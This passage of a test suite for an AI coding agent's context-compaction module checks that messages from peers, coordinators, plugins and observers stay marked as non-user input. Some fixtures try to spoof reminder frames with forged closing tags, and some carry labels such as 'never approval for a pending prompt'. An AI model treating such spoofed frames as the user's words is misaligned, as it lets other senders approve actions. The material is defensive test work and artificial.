    expect(resultOf(first.out.messages, 't9')?.text).toBe(resultOf(messages, 't9').text);
    const again = first.out.messages.map((m, k) => Object.freeze({ ...m, handle: `p${k}` }));
    const second = await compactWithApi(again, apiOf(again));
    expect(second.records()[0]).toMatchObject({ result: 'jev' });
    expect(second.calls.fetch[0].body.state.task).toContain(words);
    expect(JSON.stringify([...first.calls.fetch, ...second.calls.fetch].map((c) => c.body.state.task))).not.toMatch(/QUOTED-BY-/);
  });

  it('each carried block keeps its own envelope: the user\'s message after an unwrapped coordinator or non-user-source message stays theirs at the next compaction', async () => {
    const peer = '<system-reminder id="c4c2c2c9">\nAnother Claude session sent a message while you were working:\n<agent-message from="worker">WORDS-OF-PEER</agent-message>\n</system-reminder id="c4c2c2c9">';
    const coordinator = 'The coordinator sent a message while you were working:\nWORDS-OF-COORDINATOR, quoting </system-reminder id="jev-1">';
    const plugin = '[MESSAGE FROM NON-USER SOURCE - NOT USER INPUT]\nWORDS-OF-PLUGIN';
    const words = 'Then open notes-9.txt and stop.';
    const messages = conversation(30);
    const first = await compactWithApi(messages, apiOf(messages, { t10: [peer, coordinator, plugin, framed(words)] }));
    expect(first.records()[0]).toMatchObject({ result: 'jev', queued_user: 1, queued_other: 3, queued_carried: 4, mentioned: 1 });
    // The host's envelope stays as it is; an id the block or the row already holds is not reused.
    const row = first.out.messages.find((m) => (m.text || '').includes('WORDS-OF-COORDINATOR'));
    expect(row.text).toBe([peer, carried(coordinator, 2), carried(plugin, 3), carried(framed(words), 4)].join('\n'));
    const again = first.out.messages.map((m, k) => Object.freeze({ ...m, handle: `p${k}` }));
    const second = await compactWithApi(again, apiOf(again));
    expect(second.records()[0]).toMatchObject({ result: 'jev', queued_carried: 0, mentioned: 1 });
    expect(second.calls.fetch[0].body.state.task).toContain(words);
    expect(resultOf(second.out.messages, 't9')?.text).toBe(resultOf(messages, 't9').text);
    expect(JSON.stringify([...first.calls.fetch, ...second.calls.fetch].map((c) => c.body.state.task))).not.toMatch(/WORDS-OF-/);
    for (const b of [peer, coordinator, plugin, framed(words)]) expect(count(second.out.messages, b)).toBe(1);
  });

  it('a row rebuilt before carried messages got envelopes is read by the frames that open its lines', async () => {
    const coordinator = 'The coordinator sent a message while you were working:\nWORDS-OF-COORDINATOR';
    const w1 = 'First: then open notes-9.txt.';
    const w2 = 'Second: one sentence.';
    const base = conversation(30);
    const t10 = base.findIndex((m) => resultOf([m], 't10'));
    const t20 = base.findIndex((m) => resultOf([m], 't20'));
    const messages = base.map((m, k) => (k === t10 ? Object.freeze({ ...m, text: [coordinator, framed(w1)].join('\n') }) : m));
    messages.splice(t20 + 1, 0, Object.freeze({ role: 'user', text: [framed(w2), coordinator].join('\n'), toolUses: [], handle: 'hold' }));
    const { out, calls, records } = await compactWithApi(messages, apiOf(messages));
    expect(records()[0]).toMatchObject({ result: 'jev', queued_carried: 0, mentioned: 1 });
    expect(calls.fetch[0].body.state.task).toEqual([w1, w2, 'Good, now sum up the NEEDED results.']);
    expect(resultOf(out.messages, 't9')?.text).toBe(resultOf(messages, 't9').text);
  });

  it('a line that only ends with "while you were working:" is no frame: a typed message and a queued one opening with it stay the user\'s, a reminder opening with it is no delivery', async () => {
    const typed = 'Please explain what changed while you were working:\nthe lines of notes-8.txt, as in <system-reminder id="jev-1">\nnot a frame\n</system-reminder id="jev-1"> and <system-reminder id="x"> left open';
    const queued = 'What else changed while you were working:\nthen open notes-9.txt';
    const reminder = '<system-reminder id="d00d">\nPlease explain what changed while you were working:\nWORDS-OF-REMINDER\n</system-reminder id="d00d">';
    const base = conversation(30);
    const messages = [...base.slice(0, -2), Object.freeze({ role: 'user', text: typed, toolUses: [], handle: 'htyped' }), ...base.slice(-2)];
    const { out, calls, records } = await compactWithApi(messages, apiOf(messages, { t10: [framed(queued), reminder] }));
    expect(records()[0]).toMatchObject({ result: 'jev', queued_user: 1, queued_other: 0, queued_carried: 1, mentioned: 2 });
    expect(calls.fetch[0].body.state.task).toEqual(expect.arrayContaining([typed, queued]));
    for (const id of ['t8', 't9']) expect(resultOf(out.messages, id)?.text).toBe(resultOf(messages, id).text);
    expect(count(out.messages, 'WORDS-OF-REMINDER')).toBe(0);
  });

  it('the bound conversation\'s and a background observer\'s frames are messages of another sender: carried, not the user\'s', async () => {
    const blocks = [
      'A message arrived in the bound thread while you were working:\nWORDS-OF-THREAD',
      'Your background observer (ci) sent a report while you were working:\nWORDS-OF-OBSERVER',
      'Activity in the bound conversation while you were working, not a new message from a person and never approval for a pending prompt:\nWORDS-OF-ACTIVITY',
    ];
    const messages = conversation(30);
    const { out, calls, records } = await compactWithApi(messages, apiOf(messages, { t10: blocks }));
    expect(records()[0]).toMatchObject({ result: 'jev', queued_user: 0, queued_other: 3, queued_carried: 3 });
    for (const b of blocks) expect(count(out.messages, b)).toBe(1);
    expect(JSON.stringify(calls.fetch.map((c) => c.body.state.task))).not.toMatch(/WORDS-OF-/);
  });

  it('carried messages count in the budget: a large one leaves less room for results and the target holds', async () => {
    const note = `<system-reminder>\n[SYSTEM NOTIFICATION - NOT USER INPUT]\n<task-notification>\n<result>${'y'.repeat(40000)}</result>\n</task-notification>\n</system-reminder>`;
    const messages = conversation(30, { needed: [21, 22, 23, 24, 25, 26, 27, 28, 29, 30] });
    const { out, records } = await compactWithApi(messages, apiOf(messages, { t10: [note] }));
    const [record] = records();
    expect(record).toMatchObject({ result: 'jev', queued_other: 1, queued_carried: 1 });
    expect(record.chars_before).toBe(chars(messages) + note.length);
    expect(count(out.messages, note)).toBe(1);
    expect(chars(out.messages)).toBe(record.chars_after);
    expect(record.chars_after).toBeLessThanOrEqual(Math.floor(record.chars_before * 0.5));
    expect(record.kept_full).toBeGreaterThan(0);
    expect(record.kept_full).toBeLessThan(10);
  });

  it('a message delivered after a row that keeps its handle counts before and after: the host brings it back', async () => {
    const words = 'Message during the screenshot.';
    const base = conversation(20);
    const tailIdx = base.length - 3;
    const messages = base.map((m, k) => (k === tailIdx ? Object.freeze({ role: 'user', text: '', toolUses: [], toolResults: [{ tool_use_id: 'img', text: '', result: [{ type: 'image' }] }], handle: 'himg' }) : m));
    messages[tailIdx - 1] = Object.freeze({ role: 'assistant', text: 'Screenshot.', toolUses: [{ tool_use_id: 'img', tool: 'Screenshot', input: {} }], handle: 'hcall' });
    const { out, records } = await compactWithApi(messages, apiOf(messages, { img: [framed(words)] }));
    const [record] = records();
    expect(record).toMatchObject({ result: 'jev', kept_handle: 1, queued_user: 1, queued_carried: 0 });
    expect(out.messages).toContain(messages[tailIdx]);
    expect(count(out.messages, framed(words))).toBe(0);
    expect(record.chars_before).toBe(chars(messages) + framed(words).length);
    expect(record.chars_after).toBe(chars(out.messages) + framed(words).length);
  });

  it('without the API form the delivered messages cannot be seen, and the record says so', async () => {
    const messages = conversation(30);
    const { out, records } = await compactWithApi(messages, messages);
    expect(out.messages.length).toBeGreaterThan(0);
    expect(records()[0]).toMatchObject({ result: 'jev', queued_user: null, queued_other: null, queued_carried: 0 });
  });

  it('keeps the task list whole: every TaskCreate/TaskUpdate and the newest TodoWrite with every later call of that tool', async () => {
    const input = (i) => (i === 3 || i === 12 ? { todos: [{ content: `todo ${i}`, status: 'pending' }] } : i === 7 ? { subject: 'task seven' } : { command: `cat notes-${i}.txt` });
    const tool = (i) => (i === 3 || i === 12 ? 'TodoWrite' : i === 7 ? 'TaskCreate' : 'Bash');
    const { out } = await compactOnce(conversation(20, { tool, input }));
    const kept = out.messages.flatMap((m) => m.toolUses || []);
    expect(kept.some((u) => u.tool_use_id === 't12')).toBe(true);
    expect(kept.some((u) => u.tool_use_id === 't7')).toBe(true);
    expect(kept.some((u) => u.tool_use_id === 't3')).toBe(false);
  });

  it('rebuilds kept text results from their text (not the engine handle); a non-text result in the tail keeps its handle', async () => {
    const base = conversation(20, { needed: [2] });
    const tailIdx = base.length - 3;
    const withImage = base.map((m, k) => (k === tailIdx ? Object.freeze({ role: 'user', text: '', toolUses: [], toolResults: [{ tool_use_id: 'img', text: '', result: [{ type: 'image' }] }], handle: 'himg' }) : m));
    withImage[tailIdx - 1] = Object.freeze({ role: 'assistant', text: 'Screenshot.', toolUses: [{ tool_use_id: 'img', tool: 'Screenshot', input: {} }], handle: 'hcall' });
    const { out, records } = await compactOnce(withImage);
    const keptMessage = out.messages.find((m) => (m.toolResults || []).some((r) => r.tool_use_id === 't2'));
    expect(keptMessage.handle).toBeUndefined();
    expect(out.messages).toContain(withImage[tailIdx]);
    expect(records()[0].kept_handle).toBe(1);
  });

  it('the pairing guard rejects a built list with a result whose call is gone or a call whose result is gone', () => {
    const call = (id) => ({ role: 'assistant', text: '', toolUses: [{ tool_use_id: id, tool: 'Bash', input: {} }] });
    const res = (id) => ({ role: 'user', text: '', toolUses: [], toolResults: [{ tool_use_id: id, text: 'r' }] });
    const original = [call('a'), res('a'), call('b'), res('b')];
    expect(pairingOk(original, original)).toBe(true);
    expect(pairingOk(original, [call('b'), res('b')])).toBe(true);
    expect(pairingOk(original, [res('a'), call('b'), res('b')])).toBe(false);
    expect(pairingOk(original, [call('a'), call('b'), res('b')])).toBe(false);
  });

  it('a tail result reusing the id of an early call is removed with it, never left without its call', async () => {
    const base = conversation(20);
    const dup = [...base.slice(0, -2), Object.freeze({ role: 'user', text: '', toolUses: [], toolResults: [{ tool_use_id: 't1', text: 'again', isError: false }] }), ...base.slice(-2)];
    const { out } = await compactOnce(dup);
    const kept = out.messages.flatMap((m) => m.toolResults || []).filter((r) => r.tool_use_id === 't1');
    const calls = out.messages.flatMap((m) => m.toolUses || []).filter((u) => u.tool_use_id === 't1');
    expect(kept.length === 0 || calls.length > 0).toBe(true);
  });

  it('shadow: computes and logs the decision, then the built-in summary runs', async () => {
    const env = { ...ACTIVE_ENV, OMC_JEV: 'compaction' };
    const { out, next, calls, records } = await compactOnce(conversation(30), { env });
    expect(calls.fetch).toHaveLength(1);
    expect(next.seen).toHaveLength(1);
    expect(out).toBe(SUMMARY);
    expect(records()[0]).toMatchObject({ mode: 'shadow', result: 'shadow' });
  });

  it('precompute: active skips it (the summary would be replaced); shadow passes it on', async () => {
    const active = await compactOnce(conversation(30), {}, { trigger: 'precompute' });
    expect(active.out).toEqual({ skip: expect.any(String) });
    expect(active.next.seen).toHaveLength(0);
    expect(active.calls.fetch).toHaveLength(0);
    expect(active.calls.write).toBe(0);
    const shadow = await compactOnce(conversation(30), { env: { ...ACTIVE_ENV, OMC_JEV: 'compaction' } }, { trigger: 'precompute' });
    expect(shadow.out).toBe(SUMMARY);
    expect(shadow.calls.fetch).toHaveLength(0);
  });

  it('falls back without a request when the conversation is short or its tool results are small', async () => {
    const short = await compactOnce(conversation(2));
    expect(short.out).toBe(SUMMARY);
    expect(short.calls.fetch).toHaveLength(0);
    expect(short.records()[0]).toMatchObject({ result: 'fallback', reason: 'too_few_messages' });
    const small = await compactOnce(conversation(30, { chars: 5 }));
    expect(small.out).toBe(SUMMARY);
    expect(small.calls.fetch).toHaveLength(0);
    expect(small.records()[0]).toMatchObject({ result: 'fallback', reason: 'too_few_results' });
  });

  it('an exception falls back to next once; a spool write that throws does not stop the compaction', async () => {
    const broken = [...conversation(20)];
    broken[5] = Object.freeze({ role: 'assistant', text: 'x', toolUses: 5 });
    const failed = await compactOnce(broken);
    expect(failed.next.seen).toHaveLength(1);
    expect(failed.records()[0]).toMatchObject({ result: 'fallback', reason: 'exception' });
    const noWrite = await compactOnce(conversation(30), { writeThrows: true });
    expect(noWrite.out.messages).toBeDefined();
    expect(noWrite.next.seen).toHaveLength(0);
  });

  it('a toast only with OMC_JEV_COMPACT_TOAST=1, never $.ui.log', async () => {
    const quiet = await compactOnce(conversation(30));
    expect(quiet.calls.toast).toHaveLength(0);
    const loud = await compactOnce(conversation(30), { env: { ...ACTIVE_ENV, OMC_JEV_COMPACT_TOAST: '1' } });
    expect(loud.calls.toast).toHaveLength(1);
    expect(loud.calls.toast[0]).toMatch(/^Jev compaction: \d+ -> \d+ chars$/);
    expect(quiet.calls.log + loud.calls.log).toBe(0);
  });

  it('reads the settings env when the process has no OMC_JEV; nothing is written without a home or log directory', async () => {
    const fromSettings = await compactOnce(conversation(30), { env: {}, settingsEnv: { ...ACTIVE_ENV } });
    expect(fromSettings.calls.fetch).toHaveLength(1);
    expect(fromSettings.out.messages).toBeDefined();
    const noHome = await compactOnce(conversation(30), { env: { OMC_JEV: 'compaction:active', TYPESAFE_API_KEY: 'k' } });
    expect(noHome.out.messages).toBeDefined();
    expect(noHome.calls.write).toBe(0);
  });
});

describe('jev-compaction module: endpoint failures', () => {
  it('HTTP 500 falls back and pauses requests for 60 s; the next compaction runs the summary without a request', async () => {
    const handlers = load();
    const first = await compactOnce(conversation(30), { handlers, respond: () => ({ ok: false, status: 500, headers: {}, text: 'boom' }) });
    expect(first.out).toBe(SUMMARY);
    expect(first.records()[0]).toMatchObject({ result: 'fallback', reason: 'jev_error', failure: 'http_500' });
    const second = await compactOnce(conversation(30), { handlers });
    expect(second.calls.fetch).toHaveLength(0);
    expect(second.out).toBe(SUMMARY);
    const record = second.records()[0];
    expect(record).toMatchObject({ reason: 'paused', pause_reason: 'http_500' });
    const pause = Date.parse(record.paused_until) - Date.now();
    expect(pause).toBeGreaterThan(50_000);
    expect(pause).toBeLessThanOrEqual(60_000);
  });

  it('honors Retry-After in seconds and as an HTTP date, capped at 30 minutes; 401/402/403 pause 10 minutes without it', () => {
    const now = Date.parse('2026-11-09T12:00:00Z');
    expect(classifyFailure({ error: { status: 429, retryAfter: '120' } }, now)).toEqual({ kind: 'http_429', pauseMs: 120_000 });
    expect(classifyFailure({ error: { status: 503, retryAfter: 'Mon, 09 Nov 2026 12:05:00 GMT' } }, now)).toEqual({ kind: 'http_503', pauseMs: 300_000 });
    expect(classifyFailure({ error: { status: 429, retryAfter: '999999' } }, now).pauseMs).toBe(1_800_000);
    expect(classifyFailure({ error: { status: 402 } }, now).pauseMs).toBe(600_000);
    expect(classifyFailure({ error: { status: 401 } }, now).pauseMs).toBe(600_000);
    expect(classifyFailure({ error: { status: 403 } }, now).pauseMs).toBe(600_000);
    expect(classifyFailure({ error: { status: 429 } }, now).pauseMs).toBe(60_000);
    expect(classifyFailure({ error: { status: 400 } }, now)).toEqual({ kind: 'http_400' });
    expect(classifyFailure({ timeout: true }, now)).toEqual({ kind: 'timeout', noResponse: true });
    expect(classifyFailure({ error: new Error('network down') }, now)).toEqual({ kind: 'no_response', noResponse: true });
    expect(retryAfterMs('soon', now)).toBeUndefined();
  });

  it('takes a Retry-After date only in the three HTTP forms, like the shared breaker', () => {
    const now = Date.parse('2026-11-09T12:00:00Z');
    expect(retryAfterMs('Mon, 09 Nov 2026 12:05:00 GMT', now)).toBe(300_000);
    expect(retryAfterMs('Monday, 09-Nov-26 12:05:00 GMT', now)).toBe(300_000);
    expect(retryAfterMs('Mon Nov  9 12:05:00 2026', now)).toBe(300_000);
    expect(retryAfterMs('Nov 9 2026 12:05', now)).toBeUndefined();
    expect(retryAfterMs('2026-11-09T12:05:00Z', now)).toBeUndefined();
    expect(retryAfterMs('9/11/2026', now)).toBeUndefined();
  });

  it('rounds a fractional Retry-After up to whole seconds, never down', () => {
    const now = Date.parse('2026-11-09T12:00:00Z');
    expect(retryAfterMs('1.5', now)).toBe(2000);
    expect(retryAfterMs('0.2', now)).toBe(1000);
    expect(retryAfterMs('90.0', now)).toBe(90_000);
    expect(classifyFailure({ error: { status: 429, retryAfter: '1.5' } }, now)).toEqual({ kind: 'http_429', pauseMs: 2000 });
    expect(classifyFailure({ error: { status: 429, retryAfter: '0.2' } }, now)).toEqual({ kind: 'http_429', pauseMs: 1000 });
    expect(classifyFailure({ error: { status: 503, retryAfter: '99999.5' } }, now).pauseMs).toBe(1_800_000);
  });

  it('reads Retry-After from the response headers', async () => {
    const handlers = load();
    await compactOnce(conversation(30), { handlers, respond: () => ({ ok: false, status: 429, headers: { 'retry-after': '90' }, text: '' }) });
    const second = await compactOnce(conversation(30), { handlers });
    const pause = Date.parse(second.records()[0].paused_until) - Date.now();
    expect(pause).toBeGreaterThan(80_000);
    expect(pause).toBeLessThanOrEqual(90_000);
  });

  it('requests that do not answer in time fall back with reason timeout; three within a minute pause requests', async () => {
    const handlers = load();
    const hang = () => new Promise(() => {});
    const run = await compactOnce(conversation(110, { chars: 600 }), { handlers, respond: hang, clockAfter: 5 });
    expect(run.out).toBe(SUMMARY);
    expect(run.records()[0]).toMatchObject({ reason: 'timeout', failure: 'timeout,timeout,timeout', requests: 3, requests_ok: 0 });
    const fourth = await compactOnce(conversation(30), { handlers });
    expect(fourth.calls.fetch).toHaveLength(0);
    expect(fourth.records()[0]).toMatchObject({ reason: 'paused', pause_reason: 'no_response' });
  });

  it('three failed compactions in a row stop the requests for the rest of the session', async () => {
    const handlers = load();
    const bad = () => ({ ok: false, status: 400, headers: {}, text: '' });
    for (let k = 0; k < 3; k++) await compactOnce(conversation(30), { handlers, respond: bad });
    const after = await compactOnce(conversation(30), { handlers });
    expect(after.calls.fetch).toHaveLength(0);
    expect(after.records()[0]).toMatchObject({ reason: 'circuit_open' });
    // With the breaker open the host may compute the summary ahead of time again.
    const precompute = await compactOnce(conversation(30), { handlers }, { trigger: 'precompute' });
    expect(precompute.out).toBe(SUMMARY);
  });

  it('precompute passes through while requests are paused, since the summary will run then too', async () => {
    const handlers = load();
    const limited = () => ({ ok: false, status: 429, headers: { 'retry-after': '120' }, text: '' });
    await compactOnce(conversation(30), { handlers, respond: limited });
    const precompute = await compactOnce(conversation(30), { handlers }, { trigger: 'precompute' });
    expect(precompute.out).toBe(SUMMARY);
    expect(precompute.calls.fetch).toHaveLength(0);
  });

  it('masks a very long result only where its head and tail come from, and counts the omitted characters of the original', async () => {
    const secretHead = 'sk-' + 'a1'.repeat(20);
    const secretTail = 'ghp_' + 'Zx9'.repeat(10);
    const huge = `HEAD-1 key ${secretHead} ` + 'x'.repeat(300_000) + ` TAIL-1 ${secretTail}`;
    const { calls } = await compactOnce(conversation(30, { result: (i) => (i === 1 ? huge : `RESULT-${i} ${'x'.repeat(2000)}`) }), {});
    const sent = sentResults(calls).find((r) => r.result.startsWith('HEAD-1'));
    expect(sent).toBeDefined();
    expect(sent.result).toContain('sk-***');
    expect(sent.result).not.toContain(secretHead);
    expect(sent.result.endsWith('ghp_***')).toBe(true);
    expect(sent.result).toContain(`[... ${huge.length - 1500} chars omitted ...]`);
    expect(sent.result.length).toBeLessThan(1600);
    expect(JSON.stringify(calls.fetch[0].body)).not.toContain(secretTail);
  });

  it('an invalid body falls back; one failed batch of three still compacts with the rest', async () => {
    const invalid = await compactOnce(conversation(30), { respond: () => ({ ok: true, status: 200, headers: {}, text: '{"nope":1}' }) });
    expect(invalid.records()[0]).toMatchObject({ reason: 'jev_error', failure: 'invalid_response' });
    const partial = await compactOnce(conversation(110, { chars: 600 }), {
      respond: (body, n) => (n === 2 ? { ok: false, status: 500, headers: {}, text: '' } : okResponse(scoreByMarker(body))),
    });
    expect(partial.out.messages).toBeDefined();
    expect(partial.records()[0]).toMatchObject({ result: 'jev', requests: 3, requests_ok: 2, failure: 'http_500', unanswered: 40 });
  });
});

describe('jev-compaction module: own threshold (OMC_JEV_COMPACT_AT_PERCENT)', () => {
  const env = { ...ACTIVE_ENV, OMC_JEV_COMPACT_AT_PERCENT: '60' };
  const turn = (handlers, fake, e = {}) => handlers['turn.complete'](fake.$, { isAborted: false, ...e }, async () => 'ok');
  const highUsage = () => ({ context: { tokens: 130000, window: 200000 } });

  it('asks once above the threshold of the compaction window, main loop only, then waits at least 5 turns', async () => {
    const handlers = load();
    const fake = fakeDollar({
      env,
      messages: conversation(40, { chars: 4000 }),
      usage: (opts) => (opts?.breakdown ? { context: { tokens: 130000, window: 1000000, breakdown: { rawMaxTokens: 200000 } } } : { context: { tokens: 130000, window: 1000000 } }),
    });
    expect(await turn(handlers, fake, { agentId: 'sub-1' })).toBe('ok');
    expect(fake.calls.compact).toBe(0);
    await turn(handlers, fake);
    expect(fake.calls.compact).toBe(1);
    for (let k = 0; k < 4; k++) await turn(handlers, fake);
    expect(fake.calls.compact).toBe(1);
    await turn(handlers, fake);
    expect(fake.calls.compact).toBe(2);
  });

  it('after a compaction of the main loop waits until the context grew by 10 % of the window from the lowest usage since it, from the threshold at most', async () => {
    // Threshold 60 % of 200000 = 120000; the gate wants 10 % of 200000 = 20000 above min(lowest usage, 120000).
    let tokens = 130000;
    const usage = () => ({ context: { tokens, window: 200000 } });
    const summary = (handlers, fake, event = {}) => handlers['session.compact'](fake.$, Object.freeze({ trigger: 'auto', messages: conversation(2), ...event }), summaryNext());

    // A subagent's compaction does not count: the main loop is asked at once.
    let handlers = load();
    let fake = fakeDollar({ env, messages: conversation(40, { chars: 4000 }), usage });
    expect(await summary(handlers, fake, { agentId: 'sub-1' })).toEqual(SUMMARY);
    await turn(handlers, fake);
    expect(fake.calls.compact).toBe(1);

    // The host's summary ends at 130000, above the threshold: 139000 (19000 above it) waits, 141000 asks.
    handlers = load();
    fake = fakeDollar({ env, messages: conversation(40, { chars: 4000 }), usage });
    expect(await summary(handlers, fake)).toEqual(SUMMARY);
    for (let k = 0; k < 6; k++) await turn(handlers, fake);
    expect(fake.calls.compact).toBe(0);
    tokens = 139000;
    for (let k = 0; k < 6; k++) await turn(handlers, fake);
    expect(fake.calls.compact).toBe(0);
    tokens = 141000;
    await turn(handlers, fake);
    expect(fake.calls.compact).toBe(1);

    // The compaction it asked for ends at 100000: that first usage is the base, taken within the 5-turn
    // gap; the gap still holds, and 5 turns after the request 125000 (25000 above the base) asks again.
    // A base taken only after the gap would be 125000 and that turn would not ask.
    tokens = 100000;
    expect(await summary(handlers, fake)).toEqual(SUMMARY);
    await turn(handlers, fake);
    tokens = 125000;
    for (let k = 0; k < 3; k++) await turn(handlers, fake);
    expect(fake.calls.compact).toBe(1);
    await turn(handlers, fake);
    expect(fake.calls.compact).toBe(2);

    // A first reading that still counts the request from before the compaction (180000) is not the base:
    // the next one (52000) is, so 121000 asks. Taken from the first reading alone it would wait for 140000.
    handlers = load();
    fake = fakeDollar({ env, messages: conversation(40, { chars: 4000 }), usage });
    await summary(handlers, fake);
    tokens = 180000;
    await turn(handlers, fake);
    tokens = 52000;
    await turn(handlers, fake);
    tokens = 121000;
    await turn(handlers, fake);
    expect(fake.calls.compact).toBe(1);

    // A compaction that ends just below the threshold (110000) waits for the same growth: 125000 waits,
    // 130000 asks.
    handlers = load();
    fake = fakeDollar({ env, messages: conversation(40, { chars: 4000 }), usage });
    await summary(handlers, fake);
    tokens = 110000;
    await turn(handlers, fake);
    tokens = 125000;
    for (let k = 0; k < 6; k++) await turn(handlers, fake);
    expect(fake.calls.compact).toBe(0);
    tokens = 130000;
    await turn(handlers, fake);
    expect(fake.calls.compact).toBe(1);
  });

  it('a summary that another mod skips leaves the growth gate disarmed: the next turn asks at once', async () => {
    const handlers = load();
    const fake = fakeDollar({ env, messages: conversation(40, { chars: 4000 }), usage: highUsage });
    const skip = { skip: 'vetoed by another mod' };
    expect(await handlers['session.compact'](fake.$, Object.freeze({ trigger: 'auto', messages: conversation(2) }), async () => skip)).toBe(skip);
    await turn(handlers, fake);
    expect(fake.calls.compact).toBe(1);
  });

  it('a compaction while requests are paused still gets its base: once the pause ends, 125000 asks after a summary that ended at 100000', async () => {
    const handlers = load();
    await compactOnce(conversation(30), { handlers, respond: () => ({ ok: false, status: 500, headers: {}, text: '' }) });
    let tokens = 100000;
    const fake = fakeDollar({ env, messages: conversation(40, { chars: 4000 }), usage: () => ({ context: { tokens, window: 200000 } }) });
    await turn(handlers, fake);
    expect(fake.calls.usage).toBe(1);
    tokens = 125000;
    for (let k = 0; k < 6; k++) await turn(handlers, fake);
    expect(fake.calls.compact).toBe(0);
    const realNow = Date.now;
    Date.now = () => realNow() + 61_000;
    try {
      await turn(handlers, fake);
    } finally {
      Date.now = realNow;
    }
    expect(fake.calls.compact).toBe(1);
  });

  it('does not ask below the threshold or when the removable results are small; in shadow mode or without the variable it does not even read the usage', async () => {
    const below = fakeDollar({ env, messages: conversation(40, { chars: 4000 }), usage: () => ({ context: { tokens: 100000, window: 200000 } }) });
    const small = fakeDollar({ env, messages: conversation(40, { chars: 5 }), usage: highUsage });
    for (const fake of [below, small]) {
      await turn(load(), fake);
      expect(fake.calls.usage).toBeGreaterThan(0);
      expect(fake.calls.compact).toBe(0);
    }
    const shadow = fakeDollar({ env: { ...env, OMC_JEV: 'compaction' }, messages: conversation(40, { chars: 4000 }), usage: highUsage });
    const unset = fakeDollar({ env: ACTIVE_ENV, messages: conversation(40, { chars: 4000 }), usage: highUsage });
    for (const fake of [shadow, unset]) {
      await turn(load(), fake);
      expect(fake.calls.usage).toBe(0);
      expect(fake.calls.compact).toBe(0);
    }
  });

  it('does not ask while requests are paused after a failure', async () => {
    const handlers = load();
    await compactOnce(conversation(30), { handlers, respond: () => ({ ok: false, status: 401, headers: {}, text: '' }) });
    const fake = fakeDollar({ env, messages: conversation(40, { chars: 4000 }), usage: highUsage });
    await turn(handlers, fake);
    // The usage is read once: the compaction armed the growth gate, whose base is taken during a pause too.
    expect(fake.calls.usage).toBe(1);
    expect(fake.calls.compact).toBe(0);
  });

  it('logs a refusal by the host: headless (asked once per session), a running turn, a skip', async () => {
    const cases = [
      [new Error('compact is not available in headless mode'), 'host_cannot_compact', 1],
      [new Error('cannot compact while a turn is running'), 'host_turn_running', 2],
      [{ skip: 'vetoed by another mod' }, 'host_skipped', 2],
    ];
    for (const [compactResult, reason, asks] of cases) {
      const handlers = load();
      const fake = fakeDollar({ env, messages: conversation(40, { chars: 4000 }), usage: highUsage, compactResult });
      for (let k = 0; k < 7; k++) await turn(handlers, fake);
      expect(fake.calls.compact).toBe(asks);
      expect(fake.records()[0]).toMatchObject({ event: 'own_threshold', result: 'rejected', reason });
    }
  });
});

describe('jev-compaction module: shared breaker and request limit (OMC_JEV_BREAKER, OMC_JEV_MAX_RPM)', () => {
  const ENDPOINT = 'https://api.typesafe.ai/v1/systemone';
  const tmp = mkdtempSync(join(tmpdir(), 'jev-compaction-shared-'));
  const diskPrefix = tmp.replace(/\\/g, '/');
  afterAll(() => rmSync(tmp, { recursive: true, force: true, maxRetries: 20, retryDelay: 100 }));
  let count = 0;

  /** The module writes and reads the same files as the script side: the state directory is on the real file system, read and written with the script library too. */
  function shared(extra = {}) {
    count += 1;
    const dir = `${diskPrefix}/case-${count}`;
    const env = { ...ACTIVE_ENV, OMC_JEV_BREAKER_DIR: dir, ...extra };
    const settings = breakerSettings({ OMC_JEV_BREAKER: '1', OMC_JEV_MAX_RPM: extra.OMC_JEV_MAX_RPM, OMC_JEV_BREAKER_DIR: dir }, ENDPOINT, ACTIVE_ENV.TYPESAFE_API_KEY);
    return { dir, env, settings };
  }
  const compactShared = (c, messages, options = {}, event = {}) => compactOnce(messages, { env: c.env, diskPrefix, ...options }, event);
  const openByScripts = (c, status, retryAfter) => recordFailure(c.settings, sharedClassifyFailure({ status, retryAfter }));
  const hang = () => new Promise(() => {});
  // With a fake clock that shortens every timer of 5 s or more to 5 ms, the failure bookkeeping that
  // runs after a request without a response outlives the compaction's own budget; it finishes on its
  // own, so a test reads the breaker once it is there instead of at the moment the compaction returns.
  async function openBreakerOf(c) {
    for (let waited = 0; waited < 3000; waited += 20) {
      const open = readBreaker(c.settings, Date.now());
      if (open) return open;
      await new Promise((resolve) => setTimeout(resolve, 20));
    }
    return readBreaker(c.settings, Date.now());
  }
  // The limit counts UTC minutes: do not start a test that would cross a minute boundary.
  async function calmMinute() {
    const left = 60_000 - (Date.now() % 60_000);
    if (left < 8000) await new Promise((resolve) => setTimeout(resolve, left + 200));
  }

  it('(a) an open breaker file stops the request: the built-in summary runs, reason breaker_open; precompute and the own threshold also wait', async () => {
    const c = shared({ OMC_JEV_BREAKER: '1', OMC_JEV_COMPACT_AT_PERCENT: '60' });
    expect(openByScripts(c, 429, '120')).toBeDefined();
    const handlers = load();
    const run = await compactShared(c, conversation(30), { handlers });
    expect(run.calls.fetch).toHaveLength(0);
    expect(run.out).toBe(SUMMARY);
    expect(run.records()[0]).toMatchObject({ result: 'fallback', reason: 'breaker_open' });
    const precompute = await compactShared(c, conversation(30), { handlers }, { trigger: 'precompute' });
    expect(precompute.out).toBe(SUMMARY);
    expect(precompute.calls.fetch).toHaveLength(0);
    const fake = fakeDollar({ env: c.env, diskPrefix, messages: conversation(40, { chars: 4000 }), usage: () => ({ context: { tokens: 130000, window: 200000 } }) });
    await handlers['turn.complete'](fake.$, { isAborted: false }, async () => 'ok');
    expect(fake.calls.compact).toBe(0);
    // The summary armed the growth gate, whose base is read during a pause too (#4978); it never asks.
    expect(fake.calls.usage).toBe(1);
  });

  it('(a) OMC_JEV_MAX_REQUESTS stays a hard cap when two compactions wait for shared admission at once', async () => {
    await calmMinute();
    const c = shared({ OMC_JEV_BREAKER: '1', OMC_JEV_MAX_RPM: '100', OMC_JEV_MAX_REQUESTS: '1' });
    const handlers = load();
    const runs = await Promise.all([0, 1].map(() => compactShared(c, conversation(30), { handlers, fsDelayMs: 20 })));
    expect(runs.reduce((n, run) => n + run.calls.fetch.length, 0)).toBe(1);
    expect(runs.reduce((n, run) => n + run.records()[0].requests, 0)).toBe(1);
  });

  it('(a) a stalled breaker read falls back to the built-in check within the shared step deadline', async () => {
    const c = shared({ OMC_JEV_BREAKER: '1' });
    const started = Date.now();
    const run = await compactShared(c, conversation(30), { stallBreakerRead: true });
    expect(run.out).toBeDefined();
    expect(Date.now() - started).toBeLessThan(20_000);
  }, 30_000);

  it('(a) a stalled read of the per-minute limit file does not stall the preliminary guard: precompute answers within the shared step deadline', async () => {
    const c = shared({ OMC_JEV_MAX_RPM: '10' });
